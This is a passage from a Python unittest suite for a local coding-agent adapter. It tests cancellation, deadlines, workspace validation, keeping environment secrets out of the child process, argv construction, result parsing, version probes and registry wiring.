        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        self.assertEqual(result.calls[0].status, "unknown")
        assert result.calls[0].note is not None
        self.assertIn("exited cleanly without", result.calls[0].note)

    def test_exactly_one_invocation_per_call(self) -> None:
        _ = self._invoke()
        self.assertEqual(len(self.harness.spawner.run_specs), 1)

    def test_cancelled_before_first_output_never_spawns(self) -> None:
        cancel = threading.Event()
        cancel.set()
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(),
            cancel_event=cancel,
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "cancelled")
        self.assertEqual(self.harness.spawner.run_specs, [])

    def test_cancellation_mid_stream_stops_the_child(self) -> None:
        self.harness.spawner.run_scenario = {"pause_before_result": 30.0}
        cancel = threading.Event()
        emit = _chunks()
        outcome: dict[str, AdapterResult] = {}

        def run() -> None:
            outcome["result"] = self.harness.adapter.invoke(
                _call(),
                cancel_event=cancel,
                deadline=_future_deadline(60.0),
                emit=emit,
            )

        thread = threading.Thread(target=run, daemon=True)
        thread.start()
        deadline = _canonical(
            datetime.now(timezone.utc) + timedelta(seconds=15)
        )
        # Wait until the fake observed the run, then cancel.
        while len(self.harness.spawner.run_specs) == 0:
            if datetime.now(timezone.utc).isoformat() > deadline:
                self.fail("the run never started")
            time.sleep(0.05)
        started = _canonical(datetime.now(timezone.utc) + timedelta(seconds=15))
        while not self.harness.trace_records():
            if datetime.now(timezone.utc).isoformat() > started:
                self.fail("the fake never traced the run")
            time.sleep(0.05)
        cancel.set()
        thread.join(timeout=20)
        self.assertFalse(thread.is_alive(), "invoke did not return after cancellation")
        result = outcome["result"]
        self.assertEqual(result.status, "cancelled")
        assert result.calls is not None
        self.assertEqual(result.calls[0].status, "cancelled")
        self.assertTrue(self.harness.spawner.all_reaped())

    def test_deadline_mid_run_cancels_with_note(self) -> None:
        self.harness.spawner.run_scenario = {"pause_before_result": 30.0}
        deadline = _canonical(datetime.now(timezone.utc) + timedelta(seconds=1.5))
        started_at = datetime.now(timezone.utc)
        result = self._invoke(deadline=deadline)
        elapsed = (datetime.now(timezone.utc) - started_at).total_seconds()
        self.assertEqual(result.status, "cancelled")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("deadline", result.calls[0].note)
        self.assertLess(elapsed, 15.0, "the deadline was not honored promptly")
        self.assertTrue(self.harness.spawner.all_reaped())

    def test_past_deadline_cancels_without_spawning(self) -> None:
        result = self._invoke(deadline=_canonical(datetime.now(timezone.utc)))
        self.assertEqual(result.status, "cancelled")
        self.assertEqual(self.harness.spawner.run_specs, [])

    def test_unparseable_deadline_cancels(self) -> None:
        result = self._invoke(deadline="not-a-timestamp")
        self.assertEqual(result.status, "cancelled")

    def test_workspace_preserved_and_child_reaped_after_failure(self) -> None:
        result = self._invoke({"exit_code": 1})
        self.assertEqual(result.status, "failed")
        # The AUTHORIZED PROJECT is never removed by the adapter (it is
        # the user's repository, not adapter state).
        self.assertTrue(self.harness.workspace_real.is_dir())
        self.assertTrue(self.harness.spawner.all_reaped())


class WorkspaceAuthorityTests(unittest.TestCase):
    def test_missing_workspace_rejected_at_construction(self) -> None:
        with TemporaryDirectory() as tmp:
            from scarcity_router.worker_zcode_adapter import ZCodeLocalAdapter

            with self.assertRaises((OSError, NotADirectoryError)):
                _ = ZCodeLocalAdapter(
                    source_id="zc1",
                    authorized_workspace=Path(tmp) / "absent",
                )

    def test_file_workspace_rejected_at_construction(self) -> None:
        with TemporaryDirectory() as tmp:
            from scarcity_router.worker_zcode_adapter import ZCodeLocalAdapter

            plain = Path(tmp) / "plain"
            _ = plain.write_text("not a directory")
            with self.assertRaises(NotADirectoryError):
                _ = ZCodeLocalAdapter(
                    source_id="zc1", authorized_workspace=plain
                )

    def test_symlinked_configuration_resolves_to_the_real_directory(self) -> None:
        with TemporaryDirectory() as tmp:
            from scarcity_router.worker_zcode_adapter import (
                ZCodeLocalAdapter,
                validate_workspace,
            )

            real = Path(tmp) / "real-project"
            _ = real.mkdir()
            alias = Path(tmp) / "alias-project"
            os.symlink(real, alias)
            adapter = ZCodeLocalAdapter(
                source_id="zc1", authorized_workspace=alias
            )
            self.assertEqual(adapter.authorized_workspace, real)
            self.assertIsNone(validate_workspace(adapter.authorized_workspace))

    def test_adapters_never_share_one_state_subtree_as_workspace(self) -> None:
        # Workspace/adapter-state separation: an adapter state directory
        # is never accepted as the project workspace.
        with TemporaryDirectory() as tmp:
            from scarcity_router.worker_zcode_adapter import ZCodeLocalAdapter

            state = Path(tmp) / "worker-state" / "zcode-sources" / "zc1"
            _ = state.mkdir(parents=True)
            with self.assertRaises((OSError, NotADirectoryError)):
                _ = ZCodeLocalAdapter(
                    source_id="zc1",
                    authorized_workspace=state / "workspaces" / "run-x",
                )
            self.assertTrue(state.is_dir())


# ── Hygiene (no inherited secrets; closed notes) ──────────────────────────────


class HygieneTests(unittest.TestCase):
    def test_inherited_secrets_never_reach_the_child(self) -> None:
        harness = Harness()
        try:
            _ = harness.adapter.observe_inventory()
            os.environ["SR_TEST_FAKE_SECRET"] = "super-secret-value"
            try:
                emit = _chunks()
                result = harness.adapter.invoke(
                    _call(),
                    cancel_event=threading.Event(),
                    deadline=_future_deadline(),
                    emit=emit,
                )
                self.assertEqual(result.status, "completed")
            finally:
                del os.environ["SR_TEST_FAKE_SECRET"]
            spec = harness.spawner.run_specs[0]
            env = dict(spec.env)
            self.assertNotIn("SR_TEST_FAKE_SECRET", env)
            records = [r for r in harness.trace_records() if r.get("mode") == "run"]
            child_keys = set(cast("list[str]", records[0]["env_keys"]))
            self.assertNotIn("SR_TEST_FAKE_SECRET", child_keys)
            rendered = json.dumps(
                {
                    "notes": [c.note for c in (result.calls or ())],
                    "content": result.message.content if result.message else None,
                }
            )
            self.assertNotIn("super-secret-value", rendered)
        finally:
            harness.close()

    def test_notes_carry_only_closed_safe_vocabulary(self) -> None:
        harness = Harness(
            scenario={
                "events": [{"type": "turn.started"}],
                "stderr": "Error: prompt echo LEAKED-CONTENT (traceId: xyz)\n",
            }
        )
        try:
            _ = harness.adapter.observe_inventory()
            emit = _chunks()
            result = harness.adapter.invoke(
                _call(prompt="PROMPT-MARKER"),
                cancel_event=threading.Event(),
                deadline=_future_deadline(),
                emit=emit,
            )
            self.assertEqual(result.status, "completed")
            for observation in result.calls or ():
                note = observation.note or ""
                self.assertNotIn("LEAKED-CONTENT", note)
                self.assertNotIn("PROMPT-MARKER", note)
        finally:
            harness.close()


# ── Unit: argv builder, prompt mapping, result parsing, probes ─────────────────


class BuildRunArgvTests(unittest.TestCase):
    def test_exact_shape(self) -> None:
        argv = build_run_argv(
            binary=Path("/usr/bin/zcode"),
            prompt="do the thing",
            workspace=Path("/state/run-1"),
        )
        self.assertEqual(
            argv,
            (
                "/usr/bin/zcode",
                "--prompt",
                "do the thing",
                "--cwd",
                "/state/run-1",
                "--mode",
                "edit",
                "--output-format",
                "stream-json",
                "--no-browser",
            ),
        )

    def test_mode_is_always_the_safe_mode(self) -> None:
        argv = build_run_argv(
            binary=Path("/zcode"), prompt="p", workspace=Path("/w")
        )
        self.assertEqual(argv[argv.index("--mode") + 1], "edit")


class MapPromptTests(unittest.TestCase):
    def test_single_user_message_maps(self) -> None:
        self.assertEqual(
            map_prompt((AdapterMessage(role="user", content="task"),)), "task"
        )

    def test_rejection_matrix(self) -> None:
        cases: tuple[tuple[tuple[AdapterMessage, ...], str], ...] = (
            ((), "no_user_input"),
            (
                (AdapterMessage(role="user", content="a"), AdapterMessage(role="user", content="b")),
                "conversation_shape_unsupported",
            ),
            ((AdapterMessage(role="system", content="s"),), "conversation_shape_unsupported"),
            ((AdapterMessage(role="assistant", content="a"),), "conversation_shape_unsupported"),
            (
                (AdapterMessage(role="tool", content="t", tool_call_id="x"),),
                "tool_messages_unsupported",
            ),
            ((AdapterMessage(role="user", content=""),), "empty_message_unsupported"),
        )
        for messages, reason in cases:
            with self.assertRaises(ZCodeIneligible) as caught:
                _ = map_prompt(messages)
            self.assertEqual(caught.exception.reason, reason)


class ParseRunResultTests(unittest.TestCase):
    def test_healthy_result(self) -> None:
        parsed = parse_run_result(
            {
                "type": "result",
                "sessionId": "s1",
                "traceId": "t1",
                "response": "done",
                "projection": {"status": "success"},
                "unknownMember": {"future": True},
            }
        )
        self.assertEqual(parsed.response, "done")
        self.assertEqual(parsed.session_id, "s1")

    def test_absent_session_is_absent_not_invented(self) -> None:
        parsed = parse_run_result({"type": "result", "response": "done"})
        self.assertIsNone(parsed.session_id)

    def test_rejection_matrix(self) -> None:
        bad_cases: tuple[object, ...] = (
            None,
            "text",
            [],
            {"no": "response"},
            {"response": None},
            {"response": 5},
            {"response": "ok", "projection": {"status": 3}},
            {"response": "ok", "projection": "done"},
        )
        for bad in bad_cases:
            with self.assertRaises(ZCodeProtocolFailure):
                _ = parse_run_result(bad)


class ProbeTests(unittest.TestCase):
    def test_version_supported(self) -> None:
        spawner = FakeZCodeSpawner(version="0.17.4")
        try:
            version, reason = probe_zcode_version(
                Path("/bin/zcode"), spawner=spawner
            )
            self.assertEqual(version, (0, 17, 4))
            self.assertIsNone(reason)
        finally:
            spawner.reap_all()

    def test_version_prerelease_suffix_tolerated(self) -> None:
        spawner = FakeZCodeSpawner(version="0.17.4-beta.1")
        try:
            version, reason = probe_zcode_version(
                Path("/bin/zcode"), spawner=spawner
            )
            self.assertEqual(version, (0, 17, 4))
            self.assertIsNone(reason)
        finally:
            spawner.reap_all()

    def test_version_unsupported(self) -> None:
        spawner = FakeZCodeSpawner(version="0.16.8")
        try:
            version, reason = probe_zcode_version(
                Path("/bin/zcode"), spawner=spawner
            )
            self.assertIsNone(version)
            self.assertEqual(reason, "version_unsupported")
        finally:
            spawner.reap_all()

    def test_version_unparseable(self) -> None:
        spawner = FakeZCodeSpawner(version="hello world")
        try:
            version, reason = probe_zcode_version(
                Path("/bin/zcode"), spawner=spawner
            )
            self.assertIsNone(version)
            self.assertEqual(reason, "version_unparseable")
        finally:
            spawner.reap_all()

    def test_doctor_healthy(self) -> None:
        spawner = FakeZCodeSpawner()
        try:
            self.assertIsNone(
                probe_zcode_doctor(Path("/bin/zcode"), spawner=spawner)
            )
        finally:
            spawner.reap_all()

    def test_doctor_drift(self) -> None:
        spawner = FakeZCodeSpawner(doctor_doc={"unexpected": True})
        try:
            reason = probe_zcode_doctor(Path("/bin/zcode"), spawner=spawner)
            self.assertEqual(reason, "doctor_schema_changed")
        finally:
            spawner.reap_all()

    def test_doctor_nonzero_exit(self) -> None:
        spawner = FakeZCodeSpawner(doctor_exit=1)
        try:
            reason = probe_zcode_doctor(Path("/bin/zcode"), spawner=spawner)
            self.assertEqual(reason, "doctor_probe_failed")
        finally:
            spawner.reap_all()


class DiscoveryUnitTests(unittest.TestCase):
    def test_pinned_invalid(self) -> None:
        with TemporaryDirectory() as tmp:
            missing = Path(tmp) / "nope"
            binary, reason = discover_zcode_binary(pinned_binary=missing)
            self.assertIsNone(binary)
            self.assertEqual(reason, "pinned_binary_invalid")
            not_executable = Path(tmp) / "plain"
            _ = not_executable.write_text("x")
            binary, reason = discover_zcode_binary(pinned_binary=not_executable)
            self.assertIsNone(binary)
            self.assertEqual(reason, "pinned_binary_invalid")

    def test_pinned_symlink_rejected(self) -> None:
        with TemporaryDirectory() as tmp:
            real = Path(tmp) / "real"
            _ = real.write_text("x")
            _ = os.chmod(real, 0o755)
            link = Path(tmp) / "link"
            os.symlink(real, link)
            binary, reason = discover_zcode_binary(pinned_binary=link)
            self.assertIsNone(binary)
            self.assertEqual(reason, "pinned_binary_invalid")

    def test_path_lookup(self) -> None:
        with TemporaryDirectory() as tmp:
            real = Path(tmp) / "zcode"
            _ = real.write_text("x")
            _ = os.chmod(real, 0o755)
            binary, reason = discover_zcode_binary(
                path_lookup=lambda _name: str(real)
            )
            assert binary is not None
            self.assertEqual(binary.path, real)
            self.assertEqual(binary.source, "path")
            self.assertIsNone(reason)

    def test_missing(self) -> None:
        binary, reason = discover_zcode_binary(path_lookup=lambda _name: None)
        self.assertIsNone(binary)
        self.assertEqual(reason, "source_unavailable")


# ── Worker registry wiring ────────────────────────────────────────────────────


class RegistryWiringTests(unittest.TestCase):
    def test_zcode_source_flag_builds_the_adapter(self) -> None:
        with TemporaryDirectory() as tmp:
            workspace = Path(tmp) / "project"
            _ = workspace.mkdir()
            registry = build_registry(
                {
                    "zcode_sources": ["zc1"],
                    "zcode_workspace": str(workspace),
                    "state_dir": tmp,
                }
            )
            assert registry is not None
            self.assertEqual(registry.adapter_ids(), ("zcode:zc1",))
            adapter = registry.resolve("zcode:zc1")
            assert isinstance(adapter, ZCodeLocalAdapter)
            self.assertEqual(adapter.lane_resource_id, "zc1:plan-managed")
            self.assertEqual(adapter.authorized_workspace, workspace.resolve())

    def test_workspace_is_required_with_zcode_source(self) -> None:
        with self.assertRaises(WorkerConfigError):
            _ = build_registry({"zcode_sources": ["zc1"]})

    def test_workspace_canonicalized_at_construction(self) -> None:
        with TemporaryDirectory() as tmp:
            real = Path(tmp) / "project"
            _ = real.mkdir()
            alias = Path(tmp) / "alias"
            os.symlink(real, alias)
            registry = build_registry(
                {
                    "zcode_sources": ["zc1"],
                    "zcode_workspace": str(alias),
                    "state_dir": tmp,
                }
            )
            assert registry is not None
            adapter = registry.resolve("zcode:zc1")
            assert isinstance(adapter, ZCodeLocalAdapter)
            self.assertEqual(adapter.authorized_workspace, real.resolve())

    def test_missing_workspace_rejected_at_configuration(self) -> None:
        with TemporaryDirectory() as tmp:
            with self.assertRaises(WorkerConfigError):
                _ = build_registry(
                    {
                        "zcode_sources": ["zc1"],
                        "zcode_workspace": str(Path(tmp) / "absent"),
                        "state_dir": tmp,
                    }
                )

    def test_zcode_and_codex_sources_coexist(self) -> None:
        with TemporaryDirectory() as tmp:
            workspace = Path(tmp) / "project"
            _ = workspace.mkdir()
            registry = build_registry(
                {
                    "zcode_sources": ["zc1"],
                    "zcode_workspace": str(workspace),
                    "codex_sources": ["cx1"],
                    "state_dir": tmp,
                }
            )
            assert registry is not None
            self.assertEqual(
                registry.adapter_ids(), ("codex:cx1", "zcode:zc1")
            )

    def test_over_long_source_id_rejected(self) -> None:
        with TemporaryDirectory() as tmp:
            workspace = Path(tmp) / "project"
            _ = workspace.mkdir()
            with self.assertRaises(WorkerConfigError):
                _ = build_registry(
                    {
                        "zcode_sources": ["x" * 21],
                        "zcode_workspace": str(workspace),
                    }
                )

    def test_unsafe_source_id_rejected(self) -> None:
        with TemporaryDirectory() as tmp:
            workspace = Path(tmp) / "project"
            _ = workspace.mkdir()
            with self.assertRaises(WorkerConfigError):
                _ = build_registry(
                    {
                        "zcode_sources": ["bad:id"],
                        "zcode_workspace": str(workspace),
                    }
                )

    def test_no_flags_builds_nothing(self) -> None:
        self.assertIsNone(build_registry({}))


# ── SourceInventory contract for the new kind ─────────────────────────────────


class InventoryContractTests(unittest.TestCase):
    def test_zcode_kind_serializes_and_parses(self) -> None:
        inventory = SourceInventory(
            source_id="zc1",
            adapter_id="zcode:zc1",
            kind="zcode_subscription",
            observed_at="2026-09-28T00:00:00.000Z",
            auth_state="unverified",
            runtime_name="zcode",
            runtime_version="0.16.9",
            models=(),
        )
        restored = SourceInventory.from_dict(inventory.to_dict())
        self.assertEqual(restored.to_dict(), inventory.to_dict())

    def test_invalid_kind_still_rejected(self) -> None:
        with self.assertRaises(Exception):
            _ = SourceInventory(
                source_id="zc1",
                adapter_id="zcode:zc1",
                kind="not_a_kind",
                observed_at="2026-09-28T00:00:00.000Z",
                auth_state="unverified",
                runtime_name="zcode",
                runtime_version="0.16.9",
                models=(),
            )


if __name__ == "__main__":
    _ = unittest.main()
